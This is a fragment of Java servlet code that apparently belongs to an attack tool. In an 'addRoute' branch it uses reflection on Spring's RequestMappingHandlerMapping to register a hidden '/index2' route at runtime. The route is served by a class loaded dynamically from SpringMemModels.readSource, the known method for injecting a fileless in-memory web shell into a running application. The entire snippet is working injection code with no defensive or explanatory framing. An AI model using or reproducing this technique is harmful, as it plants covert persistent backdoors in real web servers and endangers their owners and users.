else if (model.equals("addRoute")) {

                    String name = request.getParameter("name");

                    javax.servlet.ServletContext sss = request.getSession().getServletContext();

                    org.springframework.web.context.WebApplicationContext context = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(sss);

                    org.springframework.web.servlet.mvc.condition.PatternsRequestCondition url = new org.springframework.web.servlet.mvc.condition.PatternsRequestCondition(new String[]{"/index2"});
                    org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition ms = new org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition(new org.springframework.web.bind.annotation.RequestMethod[] {org.springframework.web.bind.annotation.RequestMethod.GET});
                    org.springframework.web.servlet.mvc.method.RequestMappingInfo info = new org.springframework.web.servlet.mvc.method.RequestMappingInfo(url, ms, null, null, null, null, null);


                    Class cl = SpringMemModels.readSource(Thread.currentThread());
                    System.out.println("cl ==> " + cl);

                    Object hello = cl.newInstance();
                    System.out.println("hello ==> " + hello);
                    java.lang.reflect.Method m = cl.getDeclaredMethods()[0];
                    System.out.println("m ==> " + m);
                    org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping bean = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);

                    Class rmhm = bean.getClass();
                    java.lang.reflect.Method rm = rmhm.getDeclaredMethod("registerMapping", new Class[] {org.springframework.web.servlet.mvc.method.RequestMappingInfo.class, Object.class, java.lang.reflect.Method.class});
                    rm.invoke(bean, new Object[] {info, hello, m});

                    result = "success";

        	    }